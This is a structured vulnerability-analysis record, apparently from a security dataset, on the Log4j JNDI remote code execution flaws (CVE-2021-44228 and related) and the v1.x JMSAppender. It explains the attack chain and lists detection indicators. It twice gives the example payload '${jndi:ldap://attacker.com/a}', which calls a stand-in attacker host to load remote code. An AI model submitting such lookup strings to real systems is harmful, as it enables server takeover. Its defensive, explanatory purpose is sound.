package_info.package_versions: 2.0-beta9 through 2.17.0 (CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-44832); v1.x with JMSAppender enabled (SNYK-JAVA-LOG4J-2316893)
package_info.why_malicious: The affected versions of Log4j contain vulnerabilities that allow remote code execution (RCE) via user-controlled input in log messages, specifically through JNDI lookups. This enables attackers to execute arbitrary code on servers using vulnerable Log4j versions, making the package itself a vector for critical exploitation.

execution_context.trigger: At runtime, when a log message containing user-controlled data is processed by Log4j.
execution_context.file_location: Core Log4j logging logic, such as PatternLayout or message parsing components.

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, Log4j interprets the pattern, initiates a network request to the specified LDAP server, retrieves a remote Java class or serialized object, and executes or deserializes it, resulting in arbitrary code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger outbound network requests and load or execute remote code, which is a direct remote code execution vector.
malice_analysis.violated_expectations: Normal logging frameworks should treat log message content as inert data and must not interpret or execute any part of the message, nor initiate network requests based on log data.
malice_analysis.similar_legitimate_use: JNDI lookups may be used legitimately for dynamic configuration in trusted, internal-only environments, but should never be exposed to untrusted user input or external endpoints.
key_indicators: Interpretation of log message content as JNDI lookups (e.g., ${jndi:...})
Automatic outbound network requests (LDAP, RMI, etc.) triggered by log data
Remote class loading or object deserialization initiated by log message content

execution_context.trigger: At runtime, when JMSAppender is enabled and a log message containing user-controlled data is processed.
execution_context.file_location: Log4j v1.x JMSAppender configuration and message handling logic.

malicious_snippets.code_snippet: JMSAppender with untrusted user input in log messages (e.g., ${jndi:ldap://attacker.com/a})
malicious_snippets.code_language: java (configuration string interpreted by Log4j v1.x)
malicious_snippets.code_behavior: At runtime, if JMSAppender is enabled and a log message contains a JNDI lookup pattern, Log4j v1.x processes the lookup, initiates a network request to the specified endpoint, retrieves a remote Java class or serialized object, and may execute or deserialize it, leading to remote code execution.

malice_analysis.why_suspicious: JMSAppender should not process untrusted user input as JNDI lookups, as this can result in arbitrary code execution via network-based class loading or deserialization.
malice_analysis.violated_expectations: Logging appenders are expected to treat log messages as inert data and must not interpret or execute code, nor initiate network requests based on log content.
malice_analysis.similar_legitimate_use: JMSAppender is intended for sending logs to message queues in controlled environments, not for dynamic code execution or network lookups based on untrusted input.
key_indicators: JMSAppender enabled in Log4j v1.x configuration
Presence of JNDI lookup patterns in log messages processed by JMSAppender
Network requests and remote code execution or deserialization triggered by log data

attack_chain.action: Attacker submits a payload containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) via any user input that is logged.
attack_chain.leads_to: Log4j processes the log message and interprets the JNDI pattern.

attack_chain.action: Log4j initiates a network request to the attacker-controlled LDAP (or other JNDI) server as specified in the log message.
attack_chain.leads_to: Retrieval of remote code or serialized object from the attacker's server.

attack_chain.action: Log4j loads and executes the remote code or deserializes the object, resulting in arbitrary code execution on the vulnerable server.
attack_chain.leads_to: Full remote code execution and potential system compromise.

behavioral_signatures: Log message content containing JNDI lookup patterns (e.g., ${jndi:ldap://...}) processed by Log4j
Unexpected outbound LDAP, RMI, or other JNDI-related network requests from application servers immediately after logging events
Execution of code or deserialization of objects retrieved from external sources during log processing
file_indicators: Log4j configuration files (log4j2.xml, log4j.properties) with JNDI lookup features enabled
Presence of JMSAppender enabled in log4j v1.x configuration files
network_indicators: Outbound connections to LDAP, RMI, or other JNDI endpoints not part of normal application behavior
Connections to suspicious or external domains or IPs immediately following log events
detection_knowledge.how_to_detect: Monitor application logs and network traffic for JNDI lookup patterns in log messages (e.g., ${jndi:ldap://...}). Inspect Log4j configuration files for enabled JNDI features or JMSAppender. Alert on unexpected outbound LDAP/RMI connections from application servers, especially those triggered by log events. Use static analysis to detect use of vulnerable Log4j versions and dynamic analysis to observe runtime exploitation attempts. Correlate log events with subsequent network activity to identify exploitation.
